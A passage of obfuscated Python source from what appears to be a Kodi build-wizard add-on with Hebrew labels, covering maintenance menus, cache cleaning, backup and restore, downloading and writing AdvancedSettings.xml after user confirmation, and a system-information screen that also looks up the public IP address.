		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2408
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2409
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2411
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2412
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2414
def maintMenu (view =None ):#line:2416
	O0O000O000O000O00 ='[B][COLOR green]ON[/COLOR][/B]';OO0O00OOOOO0OOOOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2418
	OOOOO00O00O0000OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2419
	O00O00OOOOOOO0OO0 ='true'if AUTOCACHE =='true'else 'false'#line:2420
	O00O000000O00OOOO ='true'if AUTOPACKAGES =='true'else 'false'#line:2421
	O00OOOOOOO00OOO0O ='true'if AUTOTHUMBS =='true'else 'false'#line:2422
	OOO0OOO0O0O0OOO0O ='true'if SHOWMAINT =='true'else 'false'#line:2423
	OOO00OOOO000O00O0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2424
	O0OO0OOOO0OOO0000 ='true'if INCLUDEALL =='true'else 'false'#line:2425
	O0000OO000O0OOOOO ='true'if THIRDPARTY =='true'else 'false'#line:2426
	if wiz .Grab_Log (True )==False :O00O0000OO000O0OO =0 #line:2427
	else :O00O0000OO000O0OO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2428
	if wiz .Grab_Log (True ,True )==False :OO00O0OOOOOOO000O =0 #line:2429
	else :OO00O0OOOOOOO000O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2430
	OO00000OO0OOOO0OO =int (O00O0000OO000O0OO )+int (OO00O0OOOOOOO000O )#line:2431
	OO0000OOOOO0O0OO0 =str (OO00000OO0OOOO0OO )+' Error(s) Found'if OO00000OO0OOOO0OO >0 else 'None Found'#line:2432
	O00O00OOOO0O00O00 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2433
	if O0OO0OOOO0OOO0000 =='true':#line:2434
		OO00O0OOOO0000OOO ='true'#line:2435
		O0000000O0OO00000 ='true'#line:2436
		OO0000O00O0O0O0OO ='true'#line:2437
		O000OOO000O00OOOO ='true'#line:2438
		OOO0O0OOO00OOOO00 ='true'#line:2439
		OO0O0OOO0OOOO00O0 ='true'#line:2440
		OO00OO00OO0OO0OOO ='true'#line:2441
		O000OO0O0O000O00O ='true'#line:2442
	else :#line:2443
		OO00O0OOOO0000OOO ='true'if INCLUDEBOB =='true'else 'false'#line:2444
		O0000000O0OO00000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2445
		OO0000O00O0O0O0OO ='true'if INCLUDESPECTO =='true'else 'false'#line:2446
		O000OOO000O00OOOO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2447
		OOO0O0OOO00OOOO00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2448
		OO0O0OOO0OOOO00O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2449
		OO00OO00OO0OO0OOO ='true'if INCLUDESALTS =='true'else 'false'#line:2450
		O000OO0O0O000O00O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2451
	OO0OOOO0O00OOO0O0 =wiz .getSize (PACKAGES )#line:2452
	OOO0O0O00O0O0000O =wiz .getSize (THUMBS )#line:2453
	OO00O0O0OO0O0OO0O =wiz .getCacheSize ()#line:2454
	O0OOO00O00O00OO0O =OO0OOOO0O00OOO0O0 +OOO0O0O00O0O0000O +OO00O0O0OO0O0OO0O #line:2455
	O00O0O00OO0OO00OO =['Daily','Always','3 Days','Weekly']#line:2456
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2457
	if view =="clean"or SHOWMAINT =='true':#line:2458
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO00O00O00OO0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2459
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00O0O0OO0O0OO0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2460
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OOOO0O00OOO0O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2461
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O0O00O0O0000O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2462
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2463
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2464
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2465
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2466
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2467
	if view =="addon"or SHOWMAINT =='false':#line:2468
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2469
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2470
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2471
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2472
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2473
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2474
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2475
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2476
	if view =="misc"or SHOWMAINT =='true':#line:2477
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2478
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2479
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2480
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2481
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2482
		addFile ('View Errors in Log: %s'%(OO0000OOOOO0O0OO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2483
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2484
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2485
		addFile ('Clear Wizard Log File%s'%O00O00OOOO0O00O00 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2486
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2487
	if view =="backup"or SHOWMAINT =='true':#line:2488
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2489
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2490
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2491
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2492
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2493
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2494
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2495
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2496
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2497
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2498
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2499
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2500
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2501
	if view =="tweaks"or SHOWMAINT =='true':#line:2502
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2503
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2504
		else :#line:2505
			if os .path .exists (ADVANCED ):#line:2506
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2507
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2508
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2509
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2510
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2511
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2512
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2513
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2514
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2515
	addFile ('Show All Maintenance: %s'%OOO0OOO0O0O0OOO0O .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2516
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2517
	addFile ('Third Party Wizards: %s'%O0000OO000O0OOOOO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2518
	if O0000OO000O0OOOOO =='true':#line:2519
		O0OOO0OOO00OOO0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2520
		OOOO00O0OOOO0O0OO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2521
		OO0O0OO0O0OOOOOOO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2522
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOO0OOO00OOO0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2523
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO00O0OOOO0O0OO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2524
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0OO0O0OOOOOOO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2525
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2526
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOOOO00O00O0000OO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2527
	if OOOOO00O00O0000OO =='true':#line:2528
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00O0O00OO0OO00OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2529
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00O00OOOOOOO0OO0 .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2530
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O00O000000O00OOOO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00OOOOOOO00OOO0O .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2532
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2533
	addFile ('Include Video Cache in Clear Cache: %s'%OOO00OOOO000O00O0 .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2534
	if OOO00OOOO000O00O0 =='true':#line:2535
		addFile ('--- Include All Video Addons: %s'%O0OO0OOOO0OOO0000 .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('--- Include Bob: %s'%OO00O0OOOO0000OOO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2537
		addFile ('--- Include Phoenix: %s'%O0000000O0OO00000 .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2538
		addFile ('--- Include Specto: %s'%OO0000O00O0O0O0OO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2539
		addFile ('--- Include Exodus: %s'%OOO0O0OOO00OOOO00 .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2540
		addFile ('--- Include Salts: %s'%OO00OO00OO0OO0OOO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2541
		addFile ('--- Include Salts HD Lite: %s'%O000OO0O0O000O00O .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2542
		addFile ('--- Include One Channel: %s'%OO0O0OOO0OOOO00O0 .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2543
		addFile ('--- Include Genesis: %s'%O000OOO000O00OOOO .replace ('true',O0O000O000O000O00 ).replace ('false',OO0O00OOOOO0OOOOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2544
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2545
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2546
	setView ('files','viewType')#line:2547
def advancedWindow (url =None ):#line:2549
	if not ADVANCEDFILE =='http://':#line:2550
		if url ==None :#line:2551
			OOO0O00O0OO0O0OOO =wiz .workingURL (ADVANCEDFILE )#line:2552
			O0OOO00000OO00OOO =uservar .ADVANCEDFILE #line:2553
		else :#line:2554
			OOO0O00O0OO0O0OOO =wiz .workingURL (url )#line:2555
			O0OOO00000OO00OOO =url #line:2556
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2557
		if os .path .exists (ADVANCED ):#line:2558
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2559
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2560
		if OOO0O00O0OO0O0OOO ==True :#line:2561
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2562
			OOO0O000O0000000O =wiz .openURL (O0OOO00000OO00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2563
			O0OO00000O0OOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO0O000O0000000O )#line:2564
			if len (O0OO00000O0OOOOOO )>0 :#line:2565
				for O000O0OOOOOOOOO0O ,OO0O00OO0OO0O00O0 ,url ,O000OOO0O00O00O00 ,O00OOOOO0O000OO00 ,O00000O00OOO0O000 in O0OO00000O0OOOOOO :#line:2566
					if OO0O00OO0OO0O00O0 .lower ()=="yes":#line:2567
						addDir ("[B]%s[/B]"%O000O0OOOOOOOOO0O ,'advancedsetting',url ,description =O00000O00OOO0O000 ,icon =O000OOO0O00O00O00 ,fanart =O00OOOOO0O000OO00 ,themeit =THEME3 )#line:2568
					else :#line:2569
						addFile (O000O0OOOOOOOOO0O ,'writeadvanced',O000O0OOOOOOOOO0O ,url ,description =O00000O00OOO0O000 ,icon =O000OOO0O00O00O00 ,fanart =O00OOOOO0O000OO00 ,themeit =THEME2 )#line:2570
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2571
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0O00O0OO0O0OOO )#line:2572
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2573
def writeAdvanced (OO0000O0O0O0OO00O ,O0000O00O0OOO0OOO ):#line:2575
	O0OOO000O00O00OO0 =wiz .workingURL (O0000O00O0OOO0OOO )#line:2576
	if O0OOO000O00O00OO0 ==True :#line:2577
		if os .path .exists (ADVANCED ):OOO0O0OOOO00OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0000O0O0O0OO00O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2578
		else :OOO0O0OOOO00OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0000O0O0O0OO00O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2579
		if OOO0O0OOOO00OO00O ==1 :#line:2581
			OO0OOOO00O0O0O00O =wiz .openURL (O0000O00O0OOO0OOO )#line:2582
			OOO00000OOOO0O00O =open (ADVANCED ,'w');#line:2583
			OOO00000OOOO0O00O .write (OO0OOOO00O0O0O00O )#line:2584
			OOO00000OOOO0O00O .close ()#line:2585
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2586
			wiz .killxbmc (True )#line:2587
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2588
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOO000O00O00OO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2589
def viewAdvanced ():#line:2591
	OO0OO000O00000O00 =open (ADVANCED )#line:2592
	O0O00O000O0000OO0 =OO0OO000O00000O00 .read ().replace ('\t','    ')#line:2593
	wiz .TextBox (ADDONTITLE ,O0O00O000O0000OO0 )#line:2594
	OO0OO000O00000O00 .close ()#line:2595
def removeAdvanced ():#line:2597
	if os .path .exists (ADVANCED ):#line:2598
		wiz .removeFile (ADVANCED )#line:2599
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2600
def showAutoAdvanced ():#line:2602
	notify .autoConfig ()#line:2603
def getIP ():#line:2605
	OO0O000OOOOOO0O0O ='http://whatismyipaddress.com/'#line:2606
	if not wiz .workingURL (OO0O000OOOOOO0O0O ):return 'Unknown','Unknown','Unknown'#line:2607
	O0000O0O00O0000OO =wiz .openURL (OO0O000OOOOOO0O0O ).replace ('\n','').replace ('\r','')#line:2608
	if not 'Access Denied'in O0000O0O00O0000OO :#line:2609
		OO00OOOO0O0OOOO0O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0000O0O00O0000OO )#line:2610
		O0O0000O00OO00O00 =OO00OOOO0O0OOOO0O [0 ]if (len (OO00OOOO0O0OOOO0O )>0 )else 'Unknown'#line:2611
		O00000O0OO000OOOO =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0000O0O00O0000OO )#line:2612
		OOO00OOOOO00O0000 =O00000O0OO000OOOO [0 ]if (len (O00000O0OO000OOOO )>0 )else 'Unknown'#line:2613
		OOOO0O00O000O0O0O =O00000O0OO000OOOO [1 ]+', '+O00000O0OO000OOOO [2 ]+', '+O00000O0OO000OOOO [3 ]if (len (O00000O0OO000OOOO )>2 )else 'Unknown'#line:2614
		return O0O0000O00OO00O00 ,OOO00OOOOO00O0000 ,OOOO0O00O000O0O0O #line:2615
	else :return 'Unknown','Unknown','Unknown'#line:2616
def systemInfo ():#line:2618
	OO0O0OO00OOOOO0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2632
	O0OOO00O0OO0O0O0O =[];O0OOO0O0OO00O0O00 =0 #line:2633
	for OO0OOO00O0O000OO0 in OO0O0OO00OOOOO0O0 :#line:2634
		OOOO00O0O0O000O0O =wiz .getInfo (OO0OOO00O0O000OO0 )#line:2635
		OO00OOO00000OOO00 =0 #line:2636
		while OOOO00O0O0O000O0O =="Busy"and OO00OOO00000OOO00 <10 :#line:2637
			OOOO00O0O0O000O0O =wiz .getInfo (OO0OOO00O0O000OO0 );OO00OOO00000OOO00 +=1 ;wiz .log ("%s sleep %s"%(OO0OOO00O0O000OO0 ,str (OO00OOO00000OOO00 )));xbmc .sleep (1000 )#line:2638
		O0OOO00O0OO0O0O0O .append (OOOO00O0O0O000O0O )#line:2639
		O0OOO0O0OO00O0O00 +=1 #line:2640
	OO0OOOOO00O0000O0 =O0OOO00O0OO0O0O0O [8 ]if 'Una'in O0OOO00O0OO0O0O0O [8 ]else wiz .convertSize (int (float (O0OOO00O0OO0O0O0O [8 ][:-8 ]))*1024 *1024 )#line:2641
	OOOO00OO00000OO00 =O0OOO00O0OO0O0O0O [9 ]if 'Una'in O0OOO00O0OO0O0O0O [9 ]else wiz .convertSize (int (float (O0OOO00O0OO0O0O0O [9 ][:-8 ]))*1024 *1024 )#line:2642
	OO0OOOOOO0OOOO00O =O0OOO00O0OO0O0O0O [10 ]if 'Una'in O0OOO00O0OO0O0O0O [10 ]else wiz .convertSize (int (float (O0OOO00O0OO0O0O0O [10 ][:-8 ]))*1024 *1024 )#line:2643
	O0000OO0O0O000OO0 =wiz .convertSize (int (float (O0OOO00O0OO0O0O0O [11 ][:-2 ]))*1024 *1024 )#line:2644
	OOOO0O0O00OOO0OO0 =wiz .convertSize (int (float (O0OOO00O0OO0O0O0O [12 ][:-2 ]))*1024 *1024 )#line:2645
	OOOO000O00O0OOO00 =wiz .convertSize (int (float (O0OOO00O0OO0O0O0O [13 ][:-2 ]))*1024 *1024 )#line:2646
	OOOO0OOO00OO00OOO ,O0OOO0OOO00O0O0O0 ,OOO00OO0OO00OOOOO =getIP ()#line:2647
	O00O00000O0O00O00 =[];O000OOOOO0O0OOOOO =[];OOOOOOO00O00O0O00 =[];OOO0OOOOO0O0O0OOO =[];OOO00O0O00000000O =[];O0OOOOO0O00OOOOO0 =[];OOO0OO0000OOOOOO0 =[]#line:2649
	O0OO0OOOOO0O00000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2651
	for O00O0O0O000OOO0O0 in sorted (O0OO0OOOOO0O00000 ,key =lambda OO00000O00OO0O0OO :OO00000O00OO0O0OO ):#line:2652
		O0O00O000OO00O0OO =os .path .split (O00O0O0O000OOO0O0 [:-1 ])[1 ]#line:2653
		if O0O00O000OO00O0OO =='packages':continue #line:2654
		O00O0OOOOO000OO00 =os .path .join (O00O0O0O000OOO0O0 ,'addon.xml')#line:2655
		if os .path .exists (O00O0OOOOO000OO00 ):#line:2656
			O00OOOO000O000000 =open (O00O0OOOOO000OO00 )#line:2657
			OO0000OO0O00O0OOO =O00OOOO000O000000 .read ()#line:2658
			OOO00O0OOOO0OO0O0 =re .compile ("<provides>(.+?)</provides>").findall (OO0000OO0O00O0OOO )#line:2659
			if len (OOO00O0OOOO0OO0O0 )==0 :#line:2660
				if O0O00O000OO00O0OO .startswith ('skin'):OOO0OO0000OOOOOO0 .append (O0O00O000OO00O0OO )#line:2661
				if O0O00O000OO00O0OO .startswith ('repo'):OOO00O0O00000000O .append (O0O00O000OO00O0OO )#line:2662
				else :O0OOOOO0O00OOOOO0 .append (O0O00O000OO00O0OO )#line:2663
			elif not (OOO00O0OOOO0OO0O0 [0 ]).find ('executable')==-1 :OOO0OOOOO0O0O0OOO .append (O0O00O000OO00O0OO )#line:2664
			elif not (OOO00O0OOOO0OO0O0 [0 ]).find ('video')==-1 :OOOOOOO00O00O0O00 .append (O0O00O000OO00O0OO )#line:2665
			elif not (OOO00O0OOOO0OO0O0 [0 ]).find ('audio')==-1 :O000OOOOO0O0OOOOO .append (O0O00O000OO00O0OO )#line:2666
			elif not (OOO00O0OOOO0OO0O0 [0 ]).find ('image')==-1 :O00O00000O0O00O00 .append (O0O00O000OO00O0OO )#line:2667
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2669
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2670
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2671
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform_d ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2672
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2673
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2674
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2676
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2677
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O0OO0O0O0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2678
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2680
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOOO00O0000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2681
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OO00000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2682
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOOOO0OOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2683
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2685
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0O0O000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2686
